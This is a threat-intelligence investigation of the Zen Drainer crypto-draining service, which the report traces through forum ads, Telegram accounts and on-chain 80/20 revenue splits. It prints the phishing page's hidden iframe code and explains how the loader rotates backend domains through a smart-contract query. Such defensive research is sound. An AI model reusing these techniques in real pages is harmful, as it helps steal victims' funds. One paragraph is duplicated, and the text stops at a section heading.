---
title: "Zen Drainer — Cross-Chain DaaS Investigation"
description: "Technical investigation of Zen Drainer's Drainer-as-a-Service infrastructure, smart contracts, revenue-sharing mechanisms, and cross-chain fund flows."
tags:
  - crypto-drainer
  - phishing
  - blockchain
  - cryptocurrency
  - smart-contracts
  - cross-chain
  - threat-intelligence
type: investigation
status: completed
confidence: medium
investigation-types:
  - blockchain-investigations
  - fraud-investigations
methodologies:
  - wallet-attribution
  - infrastructure-artifact-analysis
  - behavioral-attribution
related-notes:
  - common-attribution-mistakes
tools:
  - trm-labs
  - arkham
  - osint
---
# 1. Discovery & Initial Investigative Lead
### 1.1 Initial Discovery Through Blockchain Intelligence

The investigation began with a broad search for the keyword `drainer` in TRM Labs entity search interface. Among the returned results, an entity named **Zen Drainer** appeared as the first match, classified under the _Malware_ category.

Rather than starting from a known phishing website or a previously published technical report, the research followed an on-chain intelligence lead. The initial entity discovery provided a starting point for examining blockchain addresses associated with the Zen Drainer label.

The investigation subsequently identified a victim complaint referencing a suspicious blockchain transaction and a phishing domain. These two artifacts established the initial scope of the research: reconstructing the reported attack, examining the underlying drainer mechanism, and tracing the associated financial activity.

The following sections distinguish between third-party intelligence labels, victim-reported information, and findings independently verified through blockchain records and technical artifacts.
![[Pasted image 20261027172048.png|355]]

**Figure 1.** Initial discovery of Zen Drainer through a keyword search in TRM Labs.
### 1.2 Identifying a Recurring Blockchain Address

A review of the addresses associated with the Zen Drainer entity identified a recurring EVM address:
`0xf49d21c1de07706808df9b57d8aa65129cca044d`
TRM Labs recorded transaction activity across multiple EVM-compatible networks, including Ethereum, Base, BNB Smart Chain, Arbitrum, Polygon, Optimism, Avalanche C-Chain, and Linea.
![[Pasted image 20261027211713.png]]
**Figure 2.** Zen Drainer entity and associated blockchain addresses in TRM Labs.

Further examination of public blockchain explorers revealed additional identifiers associated with the address:
- **ENS name:** `zendrain[.]eth`
- **ENS registration date:** September 13, 2026
- **Blockscan label:** `Fake_Phishing4239566`

These identifiers provided additional investigative context but were not treated as independent proof of the address holder's identity or operational role.

![[Pasted image 20261103140736.png]]
![[Pasted image 20261027230828.png]]

**Figure 3.** Address labels and ENS information from public blockchain explorers.
### 1.3 Identifying Victim Reports

A search for the recurring address on Chainabuse returned four reports categorized under phishing scams and fake return scams.

One report described an alleged wallet-draining incident on the Base network on September 22, 2026, at approximately 14:08 UTC. According to the complainant, approximately $3,000 worth of ERC-20 tokens had been stolen through a malicious token-spending authorization.

The complaint provided several technical artifacts suitable for independent examination:

|Artifact|Value|
|---|---|
|Network|Base|
|Reported incident date|September 22, 2026|
|Transaction hash|`0xe58fced64c0f4fede2b8ffe59b0cd04c0de83eef52e4ce99018edada71e0d81f`|
|Block number|`51648376`|
|Transaction sender|`0x5aceb19ccc546b8ed39d763e764364115bdfb21a`|
|Safe contract|`0xc25ee26fc3b62222481765f2732821e2f6344875`|
|Victim wallet|`0x51873d975715e6F5076442cDE47B10e9669fFD16`|
|Token contract|`0x3e12b9d6a4d12cd9b4a6d613872d0eb32f68b380`|
The complainant also referenced a phishing website: `hxxps://yakkamon.web[.]app/?claimidref`

The presence of both a blockchain transaction and a suspected phishing website made this report a useful starting point for reconstructing the incident.
At this stage, the complaint was treated as a third-party account of the incident. Its technical assertions, including the authorization mechanism and the reported financial loss, required independent validation.

![[Pasted image 20261027212410.png]]

**Figure 4.** Chainabuse reports associated with the investigated [address](https://chainabuse.com/address/0xf49d21c1de07706808df9b57d8aa65129cca044d).

### 1.4 Establishing the Investigation Scope

The initial discovery established three complementary investigative directions:
1. **Blockchain forensics:** Reconstruct the reported Base transaction, identify the authorization mechanism, and trace the resulting token transfers.
2. **Malicious infrastructure analysis:** Examine the phishing website, associated JavaScript payloads, backend endpoints, and configuration mechanisms.
3. **Threat actor and ecosystem research:** Investigate Zen Drainer's advertised service model, public communications, associated accounts, and potential relationships between the observed infrastructure and financial activity.

The investigation subsequently expanded beyond the original victim report as additional technical artifacts and infrastructure relationships were identified.
The following sections distinguish between independently verified findings, information reported by third parties, and investigative hypotheses that remain unresolved.

# 2. DaaS Ecosystem & Threat Actor Intelligence
### 2.1 Underground Advertising

To better understand the operational model behind Zen Drainer, the investigation expanded beyond blockchain activity to examine how the service was advertised and distributed within underground communities.
During this research, a Zen Drainer advertisement was identified on **Lolz**, a large Russian-language forum commonly used for discussions and trading of digital services and accounts.

The advertisement was published on **May 12, 2026**.
**Source:** [https://lolz.team/threads/9967303](https://lolz.team/threads/9967303)

The post promoted the service under the name **ZEN EVM DRAINER**, presenting it as a commercial wallet-draining solution for operators targeting EVM-compatible networks.
Further examination of the author's profile revealed the following details:

| Attribute          | Finding                                                  |
| ------------------ | -------------------------------------------------------- |
| Forum              | Lolz                                                     |
| Username           | `ZenTeam`                                                |
| Profile            | [https://lolz.team/zendrain](https://lolz.team/zendrain) |
| User ID            | `10532126`                                               |
| Registration date  | May 4, 2026                                              |
| Advertisement date | May 12, 2026                                             |
The account was registered eight days before the identified advertisement. This provides a useful reference point for the service's documented promotional activity, although it does not establish when Zen Drainer first became operational.

![[Pasted image 20261103185911.png|693]]

**Figure 5.** Zen Drainer advertisement published on Lolz on May 12, 2026.

![[Pasted image 20261026160115.png]]

**Figure 6.** Lolz profile of the advertising account `ZenTeam`.

A second advertisement was identified on **Exploit**, a Russian-language underground forum associated with cybercrime-related discussions and services.

**Source:** [https://forum.exploit.in/topic/282980](https://forum.exploit.in/topic/282980)

The advertisement was published on **May 17, 2026**, five days after the identified Lolz post.
The associated account contained the following information:

|Attribute|Finding|
|---|---|
|Forum|Exploit|
|Username|`ZenDrainer`|
|User ID|`240298`|
|Registration date|May 13, 2026|
|Advertisement date|May 17, 2026|
|Last observed activity|October 19, 2026|
The Exploit profile displayed a deposit of 0.06877 BTC (approximately $5,556.73 at the time of review). Such deposits may serve as credibility signals on underground forums, but they do not independently verify the advertised service's capabilities or operational success.

The appearance of Zen Drainer advertisements on two separate underground forums within five days indicates a coordinated or closely timed promotional effort. Whether both accounts were controlled by the same individual remains unverified.

![[Pasted image 20261028003303.png]]

**Figure 7.** Zen Drainer advertisement on Exploit, published May 17, 2026.

![[Pasted image 20261028010023.png]]

**Figure 8.** Exploit account profile.
### 2.2 Advertised Technical Capabilities
The advertisements described Zen Drainer as a multifunctional Drainer-as-a-Service platform designed to support different wallet types, blockchain networks, and token authorization mechanisms.

The following capabilities were advertised by the service:

|Category|Advertised functionality|
|---|---|
|Wallet compatibility|Support for 500+ wallets|
|Blockchain coverage|Support for 100+ EVM-compatible networks|
|Protocol integrations|Support for 1,000+ protocols|
|Token authorization|`approve`, `permit`, `Permit2`, `Permit2 Batch`, `SetApprovalForAll`|
|Transaction mechanisms|EIP-7702 atomic signatures|
|Asset targeting|Native tokens, staked assets, and locked assets|
|Revenue distribution|Autosplit and multisplit functionality|
|Automation|Automatic withdrawal when funds become available|
|Operational monitoring|Notifications about domain blacklisting|
|Customization|Configuration for different traffic sources|
|Evasion|Claimed bypass of wallet scam warnings and alerts|
These capabilities reflect the functionality advertised by Zen Drainer's promoters rather than independently verified performance.
Of particular interest are the references to **Permit2, EIP-7702, and automated revenue splitting**, as these mechanisms provide specific technical hypotheses that can be tested against the JavaScript payloads and blockchain transactions examined later in this report.

### 2.3 Affiliate Program & Revenue Sharing

Zen Drainer's advertisements also described a revenue-sharing model intended for affiliates who generate traffic and direct potential victims to phishing websites.

Two commission arrangements were advertised:

- **80/20:** Standard arrangement, with 80% allocated to the affiliate and 20% retained by the service.
- **85/15:** Preferential arrangement advertised for experienced affiliates.

The advertisements additionally stated that targeting users in the Commonwealth of Independent States (CIS) or using prohibited traffic sources could result in a permanent ban.
This restriction is noteworthy as an explicitly stated operating rule of the service. However, it should not be interpreted as reliable evidence of the operators' nationality or physical location.
The advertised revenue-sharing model provides an investigative hypothesis for interpreting potential commission flows. Any attribution of specific receiving wallets to affiliates or service operators must nevertheless be supported by transaction-level evidence.

### 2.4 Telegram Presence & Communications

The investigation also identified a Telegram channel branded **ZEN|NEWS**, which appeared to serve as a public communication channel for the service.
At the time of observation, the channel preview displayed approximately **2,975 subscribers**.
The presence of a dedicated news channel, alongside forum advertisements and an advertised support contact, suggests that Zen Drainer was promoted as an ongoing service rather than a single-use phishing kit.
However, subscriber counts and public promotional activity do not establish the number of active affiliates, successful attacks, or actual financial proceeds.

![[Pasted image 20261028004505.png]]

**Figure 9.** ZEN|NEWS Telegram channel preview.

Telegram Support Account: **@zen_drain**
The Zen Drainer promotional materials referenced the Telegram account `@zen_drain` as a contact point for the service.
The following information was established during the examination of the account:

|Attribute|Finding|
|---|---|
|Telegram username|`@zen_drain`|
|Display name|`ZEN\|SUPPORT`|
|Numeric user ID|`8704111425`|
|First recorded observation|May 17, 2026|
|Additional recorded observation|August 19, 2026|

Historical records show that the username `@zen_drain` was associated with the same numeric Telegram user ID on both recorded dates.

The numeric ID provides a more persistent reference for future investigation than the account's username or display name, which may change over time.

The account's appearance in Zen Drainer promotional materials supports its identification as an advertised support contact. However, the available evidence does not establish whether the account was operated by the developer, an administrator, or another representative of the service.
### 2.5 Public-Facing Accounts & Cross-Platform Correlation

| Platform | Account / Channel      | Identifier           | Observed role              |
| -------- | ---------------------- | -------------------- | -------------------------- |
| Lolz     | `ZenTeam`              | User ID `10532126`   | Advertisement publisher    |
| Exploit  | `ZenDrainer`           | User ID `240298`     | Advertisement publisher    |
| Telegram | `@zen_drain`           | User ID `8704111425` | Advertised support contact |
| Telegram | `ZEN\|NEWS`/`@zen_upd` | User ID 2171845445   | News / announcements       |
These accounts represent the publicly visible promotional and communication presence of Zen Drainer. Their identification does not establish that they were operated by the same individual.

Zen Drainer was promoted through at least two Russian-language underground forums and maintained a Telegram presence for service communication.
The identified promotional timeline includes:

| Date             | Platform | Observation                               |
| ---------------- | -------- | ----------------------------------------- |
| May 4, 2026      | Lolz     | Registration of `ZenTeam`                 |
| May 12, 2026     | Lolz     | Zen Drainer advertisement published       |
| May 13, 2026     | Exploit  | Registration of `ZenDrainer`              |
| May 17, 2026     | Exploit  | Zen Drainer advertisement published       |
| May 17, 2026     | Telegram | Recorded observation of `ZEN\|SUPPORT`    |
| August 19, 2026  | Telegram | Additional observation of support account |
| October 19, 2026 | Exploit  | Last recorded activity of `ZenDrainer`    |

The close timing of the forum registrations and advertisements suggests a common promotional effort.
The accounts used consistent Zen Drainer branding, while Telegram provided an advertised point of contact for prospective affiliates.
These observations support a connection between the accounts and the service's public-facing promotion. They do not independently establish common account ownership or identify the individuals operating them.
### 2.6 Attribution Assessment

The OSINT findings establish a limited but documented set of online identities associated with Zen Drainer's advertising and support activities.

The available evidence supports the following conclusions:

- `ZenTeam` was used to advertise Zen Drainer on Lolz.
- `ZenDrainer` was used to advertise the service on Exploit.
- `@zen_drain` was presented as a support contact in the service's promotional materials.
- `ZEN|NEWS` was identified as a channel branded for service announcements.

No independently verified evidence currently establishes the real-world identities of the individuals controlling these accounts.

The available information also does not establish whether the advertising accounts, support account, and announcement channel were managed by one individual or multiple participants.

The documented usernames, numeric identifiers, registration dates, and promotional activity provide reference points for future attribution work, particularly if additional infrastructure, financial, or historical account evidence becomes available.

# 3. Victim Transaction Reconstruction
### 3.1 Following the Victim's Transaction

The Chainabuse complaint identified a transaction on the Base network that allegedly resulted in the theft of approximately $3,000 in ERC-20 tokens.

To understand what happened, I examined the transaction on BaseScan and followed the movement of tokens from the reported victim's wallet.

**Transaction:** [https://basescan.org/tx/0xe58fced64c0f4fede2b8ffe59b0cd04c0de83eef52e4ce99018edada71e0d81f](https://basescan.org/tx/0xe58fced64c0f4fede2b8ffe59b0cd04c0de83eef52e4ce99018edada71e0d81f)

|Attribute|Value|
|---|---|
|Network|Base|
|Date|September 22, 2026|
|Victim wallet|`0x51873d975715e6f5076442cde47b10e9669ffd16`|
|Token|FLOWER|
|Reported loss|Approximately $3,000|

The transaction involved a Safe smart contract rather than a simple wallet-to-wallet transfer.
A closer look at the transaction's input data revealed that the Safe was used to execute multiple operations within a single transaction.
![[Pasted image 20261109201014.png]]
**Figure 10.** BaseScan transaction overview showing the Safe contract interaction.
### 3.2 How the Tokens Were Transferred

The transaction used a Safe contract and its MultiSend functionality to execute two token transfers.
Both transfers originated from the same victim wallet and involved the FLOWER token.
In simplified terms, the transaction followed this sequence:

1. An external address submitted a transaction to the Safe contract.
2. The Safe executed a batch of operations through MultiSend.
3. Two `transferFrom` operations directed FLOWER tokens from the victim's wallet to separate receiving addresses.

The `transferFrom` function allows an authorized spender to transfer tokens from another wallet. In this case, the transaction demonstrates how the tokens were moved, but does not by itself establish how the necessary authorization was obtained.

This distinction matters because the original authorization may have been granted during an earlier interaction with a phishing website.

![[Pasted image 20261104003407.png]]

**Figure 11.** Token transfers executed through the Safe contract, showing the victim wallet and two receiving addresses.
### 3.3 Identifying the 80/20 Revenue Split

One of the most interesting observations emerged when comparing the two token transfers.
The amounts were distributed in an exact **80/20 proportion** between two receiving addresses.

|Recipient|Share|Address|
|---|---|---|
|Recipient A|80%|`0x2b1e3a43c728e7a43804ac153b79717c5881e1c6`|
|Recipient B|20%|`0xf49d21c1de07706808df9b57d8aa65129cca044d`|
The second recipient was particularly significant. It was the same address associated with Zen Drainer in TRM Labs and used as the initial pivot in this investigation.

Earlier, the underground advertisements described an affiliate revenue-sharing model in which 80% of stolen funds would go to the affiliate and 20% to the service.

The observed transaction matched that advertised proportion.

This does not prove the identities of the recipients, but it provides a meaningful connection between the advertised Zen Drainer business model and the investigated transaction.

![[Pasted image 20261104003912.png]]

**Figure 12.** Distribution of FLOWER tokens between two receiving addresses, showing the 80/20 split.
### 3.4 What the Transaction Tells Us

The transaction provides three important observations.
First, the victim's FLOWER tokens were directed to two receiving addresses through a single batched smart-contract execution.
Second, the amounts followed the same 80/20 distribution advertised by Zen Drainer.
Third, the 20% recipient matched an address previously associated with the service by blockchain intelligence.
Together, these findings support a connection between the reported incident and Zen Drainer's advertised affiliate model.
However, the transaction alone does not explain how the victim was persuaded to authorize the transfer or which component of the phishing infrastructure initiated the process.
To investigate those questions, the next step was to examine the phishing website and its JavaScript payload.

# 4. Drainer Payload Analysis
### 4.1 From the Victim Report to the Phishing Website

The Chainabuse report discussed in Chapter 1 included a URL allegedly used in the incident:
`https://yakkamon[.]web[.]app/?claimidref`
I used this URL as the starting point for examining the phishing infrastructure associated with the reported theft.
The page presented itself as a **MONSTER NFT REVEAL** website, with a wallet connection button and content related to NFT rankings and rewards.
At first glance, the page resembled a promotional NFT website. However, examining its source code revealed additional components that were not visible in the browser interface.
![[Pasted image 20261027213645.png]]
**Figure 13.** MONSTER NFT REVEAL landing page referenced in the Chainabuse complaint.
### 4.2 A Hidden Iframe
While inspecting the page's HTML, I identified an iframe loading content from an external domain:
`https://xunv[.]xyz/365f2332ff15701c52d2/`
The iframe was configured with CSS properties that positioned it outside the visible page and reduced its dimensions to 1 × 1 pixel. Its visibility was also disabled.
The URL contained several parameters, including:

| Parameter | Observed value                     |
| --------- | ---------------------------------- |
| `host`    | `https://yakkamon[.]web[.]app`     |
| `href`    | URL of the landing page            |
| `pid`     | `9713e268acd3c6313b52e6ec7e4e5eea` |
| `safe3`   | `https://etherscan.io`             |
| `infra`   | `https://xunv[.]xyz`               |
The `host` and `href` parameters referenced the landing page, while `infra` pointed to the external domain.
The purpose of `pid` could not be confirmed from the HTML alone. It may represent a campaign or affiliate identifier, but this remains a hypothesis.
The presence of a hidden iframe established that the page referenced external infrastructure not apparent from its visible content. It did not, by itself, establish which wallet interactions or malicious operations that infrastructure performed.
![[Pasted image 20261027214155.png]]

```JS
<iframe src="https://xunv[.]xyz/365f2332ff15701c52d2/?host=https%3A%2F%2Fyakkamon[.]web[.]app&amp;href=https%3A%2F%2Fyakkamon.web.app%2F%3Fclaimidref&amp;pid=9713e268acd3c6313b52e6ec7e4e5eea&amp;safe3=https%3A%2F%2Fetherscan.io&amp;infra=https%3A%2F%2Fxunv.xyz" aria-hidden="true" style="position: fixed; left: -9999px; top: -9999px; width: 1px; height: 1px; border: 0px; visibility: hidden;"></iframe>
```

**Figure 14.** Hidden iframe identified in the landing page's HTML, including its external URL and parameters.
### 4.3 Examining the Obfuscated JavaScript

The next step was to inspect the JavaScript associated with the page.
One of the identified scripts was:
`https://yakkamon[.]web[.]app/fbde88808a.js`

The script was heavily obfuscated, making its behavior difficult to understand through direct inspection.
I used the JavaScript deobfuscation tool at `obf-io.deobfuscate[.]io` to obtain a more readable version and examine its functions.
During this analysis, I identified a function named `_0x2f4a02` that interacted with public BNB Smart Chain RPC endpoints.
Rather than relying on a fixed infrastructure URL embedded directly in the script, the function queried a smart contract to retrieve a value.
This became the most significant finding from the JavaScript analysis.
![[Pasted image 20261027220822.png|507]]
**Figure 15.** Obfuscated JavaScript and the corresponding deobfuscated function showing the BSC RPC interaction.
### 4.4 Retrieving Infrastructure Configuration from BSC

The deobfuscated function contained a reference to the following smart contract on BNB Smart Chain:
`0x1AC7d768E37B147c993dE943D704c4e92d7861A1`
It used the JSON-RPC method `eth_call` to query the contract without submitting an on-chain transaction.
To verify the behavior independently, I reproduced the request using `curl` against a public BSC RPC endpoint.
The contract returned an encoded string. After decoding the hexadecimal response, I recovered the following URL:
`https://zen-castle-depth-gas[.]xyz`

This URL reflected the contract's configuration at the time of my query, rather than the configuration in place during the September 22 incident.
I also checked the domain's WHOIS information. The record showed a creation date of October 24, 2026, and NameSilo as the registrar.
The result demonstrated that the JavaScript could obtain an infrastructure URL from a blockchain contract rather than relying solely on a hardcoded domain.

This approach allows a website script to retrieve a configuration value that may change over time without requiring the script itself to be replaced.

```curl
curl -X POST https://bsc-rpc.publicnode.com \
  -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","id":1,"method":"eth_call","params":[{"to":"0x1AC7d768E37B147c993dE943D704c4e92d7861A1","data":"0xb68d1809"},"latest"]}'
```

```json
{"jsonrpc":"2.0","id":1,"result":"0x0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000002068747470733a2f2f7a656e2d636173746c652d64657074682d6761732e78797a"}
```

![[Pasted image 20261027223442.png]]

**Figure 16.** BSC `eth_call` request, encoded contract response, and recovered infrastructure URL.

# 5. Backend & Dynamic Infrastructure
### 5.1 From JavaScript to the BSC Contract

The JavaScript analysis presented in Chapter 4 revealed that the Yakkamon phishing page used a dynamic mechanism to retrieve part of its infrastructure configuration. Rather than relying exclusively on hardcoded backend addresses, the loader queried a smart contract deployed on BNB Smart Chain (BSC).
The deobfuscated JavaScript contained a function that performed an `eth_call` request using the function selector `0xb68d1809`, targeting the following contract:
`0x1AC7d768E37B147c993dE943D704c4e92d7861A1`

The contract returned an encoded string containing an infrastructure URL. This established a technical mechanism through which the backend destination could be changed by updating the contract's stored configuration, without necessarily modifying the JavaScript loader distributed through the phishing page.

**Network traffic validation**
To validate the behavior observed during static analysis, I captured the network activity of the Yakkamon phishing page on November 4, 2026.
The HAR recording confirmed a request to the same BSC contract through a JSON-RPC endpoint. The response resolved to:
`https://zen-castle-depth-gas[.]xyz`

Subsequent network activity showed that the page contacted this domain and retrieved additional components:
- `POST /x7k/gc` — HTTP 200; returned a JSON object containing obfuscated JavaScript in the `e` field.
- `POST /x7k/gf` — HTTP 200; returned a large JavaScript payload containing LZ-String unpacking functionality.
- `POST /api/fp` — HTTP 503; the endpoint did not return a successful response during this capture.

This sequence provided direct network-level evidence supporting the mechanism identified through JavaScript analysis:

**Phishing page → BSC RPC request → configuration contract → backend URL → additional JavaScript and configuration requests.**

The capture also demonstrated that the backend was not uniformly unavailable: two application endpoints responded successfully, while `/api/fp` returned a service error. The purpose of that endpoint and the reason for the error could not be established from the captured response alone.

**Investigative significance**
The BSC contract provided a persistent, publicly observable reference point for the infrastructure configuration. Unlike an isolated domain observed in browser traffic, its transaction history could be examined to reconstruct previous configuration changes.
This led to the next stage of the investigation: identifying the contract's creator, examining the addresses responsible for configuration updates, and reconstructing the historical sequence of domains recorded on-chain.
The November 4 network capture reflects the infrastructure state at the time of collection. It should not be interpreted as evidence that the same backend domain or JavaScript payload was active during the September 22 victim transaction.
### 5.2 Contract Deployment & Control

Following the identification of the BSC configuration contract, I examined its deployment history and subsequent configuration updates using BscScan.
The contract was deployed on **February 12, 2026, at 00:33:11 UTC**, in block **80690547**.

**Contract address:** `0x1AC7d768E37B147c993dE943D704c4e92d7861A1`
**Contract creator:**`0xb88eCA7852A5e9b63fEB85f229a3B4a1D5064A1A`

![[Pasted image 20261104220015.png]]
**Figure 17.** BscScan contract creation details showing the deployment date, block number, and creator address of the BSC configuration contract. _Source: BscScan, investigator's screenshot._

As of October 27, 2026, the examined contract event history contained 16 `DomainUpdated(string newDomain)` events, beginning on February 12, 2026.
I examined the transactions associated with these events and found that all 16 updates were submitted from the same address that originally deployed the contract.
This finding indicates that the observed configuration changes were managed through a single blockchain address throughout the examined period.
The contract's deployment and update history also provides a useful chronological reference. Although the phishing page examined in this investigation was associated with a September 22, 2026 victim report, the configuration contract had already been deployed more than seven months earlier.
This establishes that the on-chain configuration mechanism existed before the reported victim incident. However, the deployment date alone does not establish when the Yakkamon phishing page first became active or when it began using this contract.
### 5.3 Domain Rotation History

To reconstruct the historical configuration of the backend infrastructure, I examined the `DomainUpdated(string newDomain)` events emitted by the BSC contract.

The examination identified **16 domain update events between February 12 and October 27, 2026**, providing a chronological record of the infrastructure URLs stored through the contract's update mechanism.
![[Pasted image 20261104184556.png]]

**Figure 18.** Historical timeline of 16 domain updates recorded by the BSC configuration contract.

The distribution of updates was uneven:
- **February:** 1 event, corresponding to the initial configuration.
- **June:** 1 event.
- **September:** 2 events.
- **October:** 12 events.

The most notable change occurred in October, when the frequency of domain updates increased substantially. Multiple updates were recorded on October 1, October 5, and October 24, including two changes within approximately 90 minutes on October 1.
This pattern demonstrates increasingly frequent configuration changes during the observed period. However, the blockchain records alone do not establish whether the changes were caused by domain takedowns, operational testing, infrastructure maintenance, or other factors.

**Configuration preceding the September 22 victim incident**
The timing of the September updates is particularly relevant to the victim transaction reconstructed in Chapter 3.

On **September 21, 2026, at 18:18:30 UTC**, the contract recorded the following domain:
`https://zenzenzendrnzenzenzenzen[.]xyz`

The next recorded update did not occur until October 1, 2026.
Therefore, based on the observed event history, this was the last recorded configuration value before the victim transaction on September 22.
The corresponding update transaction is:
`0xbd64d17bf015cd53848d8b707aa67b88520151b6619214faff6a04647ebebcca`

This temporal relationship is relevant, but it has an important limitation. The event history establishes the contract's recorded configuration changes; it does not independently prove that the Yakkamon phishing page queried the contract during the victim's session or contacted this particular domain on September 22.

**Configuration Observed During the November 4 Capture**

The October 27, 2026 update set the contract's configuration to:
`https://zen-castle-depth-gas[.]xyz`
This value was confirmed during the November 4 HAR capture of the Yakkamon phishing page. The capture recorded an `eth_call` request to the configuration contract, followed by requests to the returned backend domain.
A subsequent `DomainUpdated` event on November 6, 2026, at 12:36:50 UTC changed the stored configuration to:
`https://zen-stand-blossom-hello[.]xyz`
The November 6 event was identified after the initial February–October analysis and is not included in the 16-event timeline shown in Figure 18.
### 5.4 Infrastructure Connections

**External Resource Infrastructure**
The Yakkamon phishing page was observed loading an external resource from:
`https://xunv[.]xyz/365f2332ff15701c52d2/`

During a subsequent HAR capture on November 4, 2026, the same resource path was observed under a different hostname:
`https://fdar[.]xyz/365f2332ff15701c52d2/`

Both observations share the distinctive path `/365f2332ff15701c52d2/`, establishing reuse of the same URL structure across two infrastructure domains.
The available evidence does not establish whether this difference resulted from domain rotation, traffic distribution, or another deployment mechanism.

The financial investigation focused on tracing assets transferred from affected wallets, examining the distribution of proceeds, and identifying recurring on-chain patterns associated with the Zen Drainer ecosystem.
The analysis combined transaction-level reconstruction with a broader review of transfers involving the Zen-associated commission address, `0xf49d21c1de07706808df9b57d8aa65129cca044d` (`zendrain[.]eth`).
The findings indicate a recurring revenue-sharing structure consistent with the Drainer-as-a-Service (DaaS) model advertised by Zen Drainer. However, the presence of a recurring commission recipient does not, by itself, establish that every associated transaction originated from the same phishing website, affiliate, or victimization campaign.

# 6. Following the Money

The financial investigation focused on tracing assets transferred from affected wallets, examining the distribution of proceeds, and identifying recurring on-chain patterns associated with the Zen Drainer ecosystem.
The analysis combined transaction-level reconstruction with a broader review of transfers involving the Zen-associated commission address, `0xf49d21c1de07706808df9b57d8aa65129cca044d` (`zendrain[.]eth`).
The findings indicate a recurring revenue-sharing structure consistent with the Drainer-as-a-Service (DaaS) model advertised by Zen Drainer. However, the presence of a recurring commission recipient does not, by itself, establish that every associated transaction originated from the same phishing website, affiliate, or victimization campaign.
### 6.1. Revenue Distribution: The 80/20 Model

The analysis of the FLOWER token theft on the Base network identified a revenue-sharing mechanism associated with Zen Drainer. The stolen assets were divided between a primary recipient and the Zen Drainer commission wallet in an 80/20 ratio.
The commission wallet was identified as `0xF49d21C1De07706808df9b57d8AA65129cCA044d` (`zendrain[.]eth`), labelled `Fake_Phishing4239566` on BaseScan.

**Initial Transaction Reconstruction**
The FLOWER theft was executed through the SafeProxy contract `0xc25Ee26FC3b62222481765f2732821e2F6344875`.

The transaction used `execTransaction` and a MultiSend operation to execute two ERC-20 `transferFrom` calls. Approximately 80% of the stolen FLOWER tokens were transferred to `0x2B1E3a43C728e7A43804aC153B79717C5881e1c6`, while the remaining 20% were sent to `zendrain[.]eth`.
![[Pasted image 20261106173945.png]]
**Figure 19.** Reconstruction of the FLOWER token transfer through SafeProxy and MultiSend.

Further examination of the same SafeProxy identified six successful distribution operations between September 19 and September 22, 2026, involving ETH, FLOWER, USDC and Gitlawb tokens.
All six operations were initiated by `0x5aceB19ccc546b8ed39d763e764364115bdfb21a` and followed the same 80/20 distribution model.

**Native ETH Distribution**
Four of the six operations involved native ETH.
Unlike ERC-20 transfers, where tokens were transferred directly from source wallets, the ETH transactions involved an initial deposit to the SafeProxy contract, followed by a separate execution that distributed the funds.
The four reconstructed ETH transactions showed the following sequence:
1. ETH was transferred from a source wallet to the SafeProxy.
2. An external address called `execTransaction`.
3. The contract distributed 80% of the received ETH to a primary recipient and 20% to `zendrain[.]eth`.

The delay between the incoming ETH transfer and the distribution was approximately four to six seconds.
The four transactions involved three distinct source wallets and three primary recipient addresses. Two transactions used the same source and primary recipient, demonstrating repeated use of the same payment route.

**Extended Base Network Analysis**
To determine whether this mechanism was limited to the original SafeProxy, the investigation examined incoming ETH transfers to `zendrain[.]eth` and grouped them by originating contract.
This analysis identified 19 SafeProxy contracts in the examined Base transaction dataset, including the original contract.
Sixteen additional contracts were reviewed using representative `execTransaction` operations. Their transaction records showed two outgoing ETH transfers: a larger payment to a primary recipient and a smaller payment to `zendrain[.]eth`. The examined transactions consistently showed an approximately 80/20 split.
For all 16 additional contracts, the address recorded as Contract Creator also matched the address initiating the examined `execTransaction` call.
This repeated structure indicates that the revenue-sharing mechanism was implemented across multiple SafeProxy instances rather than through a single collection contract.
The analysis also identified a primary recipient, `0x0CA967BC…eFDddFc07`, receiving funds through two different SafeProxy contracts. This provides an additional on-chain link between separate distribution instances.

![[Pasted image 20261108223747.png]]
**Figure 20.** Identified SafeProxy revenue distribution activity on Base. The illustrated transaction sample should be distinguished from the broader set of 19 identified contracts.

**Interactive Transaction Analysis**
An interactive transaction graph was prepared to visualize the examined distribution operations, including their execution contracts, primary recipients and the shared Zen Drainer commission wallet.


<iframe
  src="/static/diagrams/zen_base_flow.html"
  width="100%"
  height="650"
  title="Zen Drainer — Base Transaction Flow"
  loading="lazy"
></iframe>

[**Open interactive transaction graph**](/static/diagrams/zen_base_flow)

**Assessment**
The Base network findings demonstrate in the examined transactions a consistent revenue-sharing mechanism in which 80% of the transferred assets are directed to a primary collection wallet and 20% to the Zen Drainer commission address.
The use of multiple SafeProxy contracts, repeated execution patterns and a shared commission wallet is consistent with a reusable distribution infrastructure.
The matching creator and transaction initiator addresses indicate direct operational relationships within individual SafeProxy instances. However, the available evidence does not establish whether the contracts were controlled by separate affiliates or by a common operator.
The 19 identified SafeProxy contracts represent the examined dataset and should not be interpreted as the complete number of Zen Drainer contracts deployed on Base.
### 6.2. Ethereum Mainnet — Transaction Discovery and Revenue Distribution Analysis

Following the identification of recurring 80/20 revenue-sharing operations on Base, the investigation extended to Ethereum Mainnet to examine whether similar distribution mechanisms were associated with the Zen Drainer commission address:
`0xF49d21C1De07706808df9b57d8AA65129cCA044d` **(`zendrain[.]eth`)**

#### 6.2.1. Initial Discovery Using Etherscan

The initial discovery stage involved manually examining incoming asset transfers associated with the identified commission wallet.
To narrow the investigation to transactions potentially involving automated distribution mechanisms, the following Etherscan Advanced Filter criteria were applied:

| Filter           | Selected value                  |
| ---------------- | ------------------------------- |
| Network          | Ethereum Mainnet                |
| Transaction Type | ERC-20                          |
| Method           | Exec Transaction (`0x6a761202`) |
| Age              | 180 days                        |
| Recipient        | `zendrain[.]eth`                |


![[Pasted image 20261109145709.png]]

**Figure 21.** Initial Transaction Discovery Using Etherscan Advanced Filter.

**The exported search results contained 83 ERC-20 transfer records corresponding to 77 unique transaction hashes.**
The `Exec Transaction` method was selected because it is associated with Safe smart-account execution. Safe transactions can invoke MultiSend or other contracts to perform multiple operations within a single Ethereum transaction, including transfers to multiple recipients.
This makes Safe execution a relevant investigative indicator when searching for automated revenue distribution.
In such operations, the top-level method remains `execTransaction`, while the underlying token movements are recorded through ERC-20 `Transfer` events. Consequently, searching only for transactions whose top-level method is `Transfer` would not identify the same Safe-executed operations.
Related internal calls and native ETH movements may also appear in the explorer's Internal Transactions view, depending on the execution path and available trace data.

**The filtering criteria were used for candidate discovery, not as proof of revenue sharing or malicious activity.** Each candidate requires transaction-level examination to determine whether a recognizable distribution pattern is present.

#### 6.2.2. Automated Transaction Analysis

